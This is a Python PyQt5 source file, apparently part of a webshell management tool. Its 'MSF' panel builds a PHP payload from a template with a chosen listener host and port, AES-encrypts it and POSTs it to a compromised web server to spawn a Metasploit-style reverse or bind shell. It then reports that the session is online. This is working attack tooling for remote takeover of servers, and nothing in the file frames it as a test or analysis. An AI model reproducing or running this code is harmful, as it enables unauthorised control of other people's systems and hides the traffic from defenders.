from PyQt5.QtWidgets import QWidget, QMessageBox
from .ui_msf import Ui_MSF
import os
import base64
import json


class MSF(QWidget, Ui_MSF):
    def __init__(self, service, *args, **kwargs):
        super(MSF, self).__init__(*args, **kwargs)
        self.setupUi(self)
        self.service = service
        self.connectSignal()
        self.initUi()
        self.comboBox_payload.setCurrentIndex(1)

    def connectSignal(self):
        self.btn_run.clicked.connect(self.run)
        self.lineEdit_host.editingFinished.connect(self.updateHint)
        self.comboBox_payload.currentIndexChanged.connect(self.updateHint)
        self.comboBox_payload.currentIndexChanged.connect(self.updateHostLabel)
        self.spinBox_port.editingFinished.connect(self.updateHint)

    def initUi(self):
        self.lineEdit_host.setText("0.0.0.0")
        self.spinBox_port.setValue(4444)
        self.comboBox_payload.setCurrentIndex(1)

    def updateHint(self):
        payload = self.comboBox_payload.currentText().replace("/", "-")
        ip = self.lineEdit_host.text().strip()
        port = self.spinBox_port.text().strip()
        with open(os.path.dirname(__file__) + "/template/{}.txt".format(payload), "r") as f:
            hint = f.read()
        hint = hint.replace('__IP__', ip.ljust(15, " ")).replace('__PORT__', port.ljust(15, " "))
        self.textEdit_note.setText(hint)

    def updateHostLabel(self):
        payload = self.comboBox_payload.currentText()
        if "reverse" in payload:
            self.label_host.setText("LHOST")
        else:
            self.label_host.setText("RHOST")

    def run(self):
        payload = self.comboBox_payload.currentText().replace("/", "-")
        ip = self.lineEdit_host.text().strip()
        port = self.spinBox_port.text().strip()
        with open(os.path.dirname(__file__) + "/payload/{}.php".format(payload), "rb") as f:
            code = f.read().replace(b"__IP__", base64.b64encode(ip.encode()))
            code = code.replace(b"__PORT__", port.encode())
        data = {
            "code": base64.b64encode(code).decode()
        }
        data = self.service.AESEncrypt(self.service.aesKey, json.dumps(data))
        self.service.doPOST(data, timeout=0)
        QMessageBox.information(self, "提示", "上线完成")
